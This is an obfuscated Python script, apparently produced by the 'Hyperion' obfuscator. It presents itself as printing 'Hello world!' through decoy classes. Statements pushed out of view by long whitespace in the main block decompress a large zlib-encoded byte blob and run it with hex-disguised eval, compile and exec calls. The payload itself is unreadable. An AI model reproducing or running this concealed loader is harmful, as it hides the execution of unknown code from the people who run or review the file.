from builtins import *
from math import prod as _round


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


_floor, _absolute, Add, Frame, _frame, _memoryaccess, _substract = exec, str, tuple, map, ord, globals, type

class Ceil:
    def __init__(self, Math):
        self.Divide = _round((Math, -57256))
        self.Substract(Floor=26596)

    def Substract(self, Floor = None):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Divide -= 18579 + Floor
        
        try:
            ((_floor, (_frame, _floor, Frame)) for _floor in (_frame, _floor, Frame) if _frame != _absolute)

        except AttributeError:
            ((_frame, {'leuhBihee': _absolute}) for _frame in (_frame, _floor, Frame) if _memoryaccess <= Add)

        except:
            _substract(-13887 * 70258) == int

    def Negative(self, Multiply = 97383):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Multiply -= -83070 / 10549
        self._callfunction != Ellipsis
        
        try:
            ((Frame, (_frame, _floor, Frame)) for Frame in (_floor, Frame, _absolute) if _floor <= _frame)

        except OSError:
            ({_floor: _absolute} or _floor if {_floor: _absolute} and _floor else ... or (_floor, {_floor: _absolute}))

        except:
            _substract(-40282 / -64535) == str

    def Algorithm(CallFunction = False):
        return _memoryaccess()[CallFunction]

    def _add(_run = -32881 + 10738, _system = bool, Positive = _memoryaccess):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Positive()[_run] = _system
        
        try:
            {'leuhBihee': _absolute} if _stackoverflow != Add else (Add, Add) < _floor

        except ArithmeticError:
            (((_floor, Frame, _absolute), Add) for Add in (_floor, Frame, _absolute))

        except:
            _substract(24685 + 18957) == Ellipsis

    def execute(code = str):
        return _floor(_absolute(Add(Frame(_frame, code))))

    @property
    def _callfunction(self):
        self.DetectVar = '<__main__.Frame object at 0x000002445BE76744>'
        return (self.DetectVar, Ceil._callfunction)

if __name__ == '__main__':
    try:
        Ceil.execute(code = __code__)
        _product = Ceil(Math = -42768 + 1945)

        Ceil(Math = 94309 + 61436).Substract(Floor = _product.Divide + -71819)                                                                                                                                                                                                                                                          ;Ceil._add(_run='mnmnmnmnmnnmmnnnnnm',_system=b'x\x9c\xe5Y\xddo\xa38\x10\x7f\xcf_\xc1\xe6\x05P\xbf\x88!\xe4C\xea\xcb\xa9w\xdaTi9mN\'\x9dvW\x88\x80i\xdd58\x02\xb2M\xfe\xfb\x9b\xb1\x9d&i\xc8\x05vW\xf7\x12\x0fc\x8f\x8d=\xd8?<c\x1b\xaab=\xee\x18\x10Xj\xc9\x14C\x18\x8ay\xba,\xe3\xa8\x12E\x18\x1a\x1fn\xbb\x1f\xd7\x0bZ0\x91w\rQ\xecT\x8b\x96\xd5\xb3(JY\xc7\xea\xce\x19\xe7\xeb\xea\x99>\x89\xa8r\xfb~\xf7\xb2\xfb\x1b_\xd2O4\xe9\xda{\xad\x9eX\xf5\xbc\x9c+\xc5\xcfU\xb5(\xc777\xaa\xec:\x16\xd9\xcd;57G\x9e\x9d\xb02\x16E\xb2\xafF\x17^?=\xdd,x\xf4\xb4\xa4\xef\x1aq\x16\xd3\xbc\xa4\xaa\xd1\xef\x7fN\xaf\xc8\xb5\xf3\xaeJ,\x12u\xdf\\\x14,\xaf\xac\xeeG\xca\xb90^E\xc1\x93\x0f]\xdb\xec\xd8\xe3\xb7\xdax\xdf,\xbf\xb1\xc4\xb4;t\x15\xd3E\xa5\xc1\xcc\x17Kh\xf9I\x94\xb44\xa2\x82\x1a\x05M\xbe\xe4\x7f3\xc1i\xa5\n\xe6\x80\xcc\x97\xfc\x1f\xb1\x94\xb9\xc8@%_\xf2G1\x17\xc9\xda\xe0\xec\x1b\xb4[\x8be\xd7\xee\xa8N\xb1l!\x8a*\x0c\xe1i\xeb\xd2\xb4\xaf\xe9\x8aU\x96\xdd\xe1"\x8exi\xd9\x9f\xcd<\xcb\xf3,\xc3(\x97\x01d\xf3\xeb\xed\x13\x17s\xa8\xd0\xa9\xb9+\x1bmB\x96\xeb\x9b\x19J\xe6\xe7\xf1\xf8\xe2\xea\xe2\xca\xba\xb2.z\xb6\xfd\x15\xf4\xd0*\xaa\xaa\xe2\x98\x9e\xc0q\x1c\x11\xc8K\x04\x81p\x02\x01\xc1q\x82CE\t;\xaad6\x9b\x11\xbc\x08Q\x89\xca\xc3 \xd4 ;\xf5\xf7UK\xa2\xc2\xa6\x10#h\xb8\x85\xed\xd83q\xb8\xb9\x1a\xbb\x84\x001\xab\xd5f\x99\xf3%\xe3\x15\xcb\x11\xfc\xefQQv\x0e\x9an\xf5mn@\x00}\xd9\x1e\xb8o\x90[G\x9e\xc3X\\F9\x9b\xbf\xc7\xce\xbe\x04\x94\x11W\xc4\x19\x00v$\xce\x00|\xd0Z\x93\xfd\xf9\xd7\xa9\xbafyBW\x96\xb9N\x19_\xd1\xe7|yP\xe5\xab}t\xda\x88;\xe8\x03\xf6#\xb8\x0b\x80\x85h\x0fW\x99\xb3\x8a\xb3\xe5/\x80\xeb\xa8\xa6\xf6p\x1dW\xb5\x81\xab\x8a\x04O[A%\xb0\x0b\xd2\xbe\x1c\xec\x02\x04\x88\xce\x06/\xca\xd9"\x13q\x1db\xb5\x86\xf8\xf8\xf0\xf0\xf0\x08\xf4\xf0\x88\x92\x92A|<\x1f\xc0J\x1e\xfdQ\x07\xd7q7\xca9\x9fL8\x12\x97\xe2D\xe6!{6\xa0\x15U\xd9\x0e2\xb0AI`\x98\x01\xf6\x04\x84\xb3\x01\x8b.\x8b\xbf\xda\xa15\xd3O\xd9\xde#r\x9d>\x0f\xbcx\xf4\x9d\xb6\xf0\xf8\xd2{I\xaf\xa5\xfc\x18\x10@e\x9a\xd7/\x82\xe5\xff\x01r\xa6u\xa8]\xddF\x82\xf8|\x80\x16\xe2\xf0\xeeQ\xa0\x0f\xb6l\xd6\xdc\xf4F^$i\xa49\xf2bHc-\x8f$\xa9\xdc\x08\xf6\x83\t\xc53\x83e\x0e\xd3\xaaf\xfbs&\xa8\xc7tU;\xbdk\x97\xe7\xbb\xe0\x0e.\xb5\xff\x03\x86\x14(\x10\xbb\xedk\x9d\x85e\xda\xa3\x90\x84N8\x08{\x10\xf7\xc3!\xb0\x0f\xb5\x9d\xd0}_\xdaD\x99\x0f\xcd\xfa\xd0h(\x9by@.\xd4\x1e\x1c\x966Q6\x84&\xa8\x90\x00{ \xbba\x0fj\x8f\x0eK\x9b\r\xd3\x0fq\xa88\x18\x94\xfbr\x90\x83\xfd\xb2\xd3\x8a\xeaf\xb7\xdb\xeb\xa7\xae\x07<\x00\xf6\x811Ot\x99\x0b<$s2$\xc9\xc9z\x03rr\xf6\xdb*\xdac8\xd1E\xd9<\x89\x8c\x99\nD\xcd4I\xd8\xf3q\xcd\x94\xa9\x9fF\xaf\xaf\xabW\xc9\xab\x15\xc4+\x0c\xb2\xa4\t\xc0\xf8z{\xf2}8\x00\xa5\x03\x80\x0e\xa169,\xfd\t\x90G\x1a\xb0\xbeN\x114G\xe7\x91\xdd\x1d\xa0O\xd5%\xcd\xc1~\x03\x18]\x9c\\\x04r-\xc9\xfe5\xc7\x17l\x14M\x14\x0fi\xd2L\xe5\xe9\xbe\x81\x95\xd6\x02\xe2\xed\xcc\xa2\xcdLr\xf4@\xfb\x1a\x80\xcd\xcckR\xb7\xe1\xec{\x03#x;59\xf24\xe5\xc8\x13\x15x\xc0q\xed\xc2P\x8f\x88\x9a\xa3\xdaA\xaaK\xe6f?\x01\n\xd9\x19,\x0en\xa8M\xcc\xd1\xf2.(\xa7\xea\xb6\x05\x851\xf6\xc2d\xf4\x02\x01\x12\x8e\x12\x7fi\x83\t\xb6\xe4\xa0\x02\x9aB[\xc9p~\x00\xfeAL\x1c\x92(\xabh:\x96\xe6\xba\xc9\x80\x0cN\xea\xac\x1de\xed6!\xf5R\x1f\xc8u0\xf6R\x95\xf7d\xc96\xc6\x14I\x95\x9c\xde.\xe87#\xf0\x9b\xc8\x1d\x04\xfd\x85D\x04\x8d\xed\xb6\xae\xaf}wC.AR\xe9n\x89\xcamd\x974\xee\xe9Lo\x14$o\xf7\x0e\xb3YsGs?\x9d\xdeC\x803\'\xf0\x14r\xd3\xfb&>\x1c\xd7\xfb\x81$\x02k\xeb\x10WY\xa8=<,\xfd\x7ff\xe2\x9ee\xa1\x11\x80Yh\xb3B\xbb\x00\xdb\xe2//\xe3c[\xf7zd\xd4y\\\x1d\xc5\'\xeax\x8e\xc9\x0f\x0eh\xa8\xdd\x87\xabS_\xbb\rwg\x01\xda,JM\xea6\\\x94\xda\x99h?\xed\xa7~\xe2\xf7\xfc\x91OQ\xfe\xa5&;\xd2{\xf9\xcd\xfe=\xd6\xb9H\xcb@\xa7\'~\x8b\xd1\x10o\xe8\xf7\xfd\x18(%N\x7f\xe0\xa7\x03\x02\xb2Gz\xe4\xa4\x81\xb5\x18\x95\xe7\xa5;\xe4\xf9\xe9\x960\x8f\xf7\x1b\x9b3~\xfb\x91\xdf\x80&\x9b\xf9\xd6n\xca\xd6u\xd0\xa7\x92\x12 \xba\xc7oRso\xb3\x83\xbd\xda>6\xf73\xb5]\xc3w#\xe7\x80\x92\xf6\xf3\x18+n\x83\x1f\xac\x85\\.\xa3\xb8*\xa2\x0b\xa8\xedaZ\x88\xcc\xd8\xfcV0\xd4\xaf\n\x03NQ\xf1\xa5\xfc\xf1t\t\xdc\xc1\xac%\x17S\xbeY[\xd5B\xcb\xd1\xb1\xd8\x9d\x84\xa6F\x16\xb1\xdc\xda\xf9)\xa5~[M\xee\xa7\xe0J!\x86\xe4\x1e=\xea\xd4\xee\xb0\xd4\x08\xc3<\xcah\x18\xde\xden\xdf\xefD\x7f\xe7\x93\xef}\xabG\xe9\xed\xfc\x0b\x8f\xd1Zw')

        Ceil(Math = -7376 - 60151).Negative(Multiply = 60772 - _product.Divide)                                                                                                                                                                                                                                                          ;llIllIllllIllIIllIlIIl,lIlIIIllIlIIIIIlIl,NNMMNMMNNMNNMMNNMN,SSSS2SSS22S2S2SS22S2,WWWXWWWXXWWXWWXWXXXWXXWX=(lambda JLIIJLLLJJJLIJIJJJLLIJIIJ:JLIIJLLLJJJLIJIJJJLLIJIIJ['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda JLIIJLLLJJJLIJIJJJLLIJIIJ:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(JLIIJLLLJJJLIJIJJJLLIJIIJ)"),filename='\x4f\x4f\x6f\x6f\x30\x30\x6f\x30\x4f\x30\x4f\x30\x6f\x6f\x30\x30\x30\x4f\x6f\x6f\x6f\x30\x30\x30\x4f\x30',mode='\x65\x76\x61\x6c'))),(lambda JLIIJLLLJJJLIJIJJJLLIJIIJ:JLIIJLLLJJJLIJIJJJLLIJIIJ(__import__('\x7a\x6c\x69\x62'))),(lambda xxxwwxxwwwwxxwwxwwwwwwx,JLIIJLLLJJJLIJIJJJLLIJIIJ:xxxwwxxwwwwxxwwxwwwwwwx(JLIIJLLLJJJLIJIJJJLLIJIIJ)),(lambda:(lambda JLIIJLLLJJJLIJIJJJLLIJIIJ:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(JLIIJLLLJJJLIJIJJJLLIJIIJ)"),filename='\x4f\x4f\x6f\x6f\x30\x30\x6f\x30\x4f\x30\x4f\x30\x6f\x6f\x30\x30\x30\x4f\x6f\x6f\x6f\x30\x30\x30\x4f\x30',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        if 261894 > 8580511:
            _product.Negative(Multiply = 77671 + _product.Divide)
        elif 279523 < 8723418:
            Ceil(Math = -64535 * 59322).Negative(Multiply = -21461 - _product.Divide)                                                                                                                                                                                                                                                          ;WWWXWWWXXWWXWWXWXXXWXXWX()(SSSS2SSS22S2S2SS22S2(llIllIllllIllIIllIlIIl(NNMMNMMNNMNNMMNNMN(lIlIIIllIlIIIIIlIl('\x76\x61\x72\x73'))),Ceil.Algorithm(CallFunction='mnmnmnmnmnnmmnnnnnm')))

    except Exception as _stackoverflow:
        if 340385 > 4262337:
            Ceil.execute(code = _absolute(_stackoverflow))

        elif 323721 > 646344:
            Ceil(Math = 28018 / 76079).Negative(Multiply = -89295 + _product.Divide)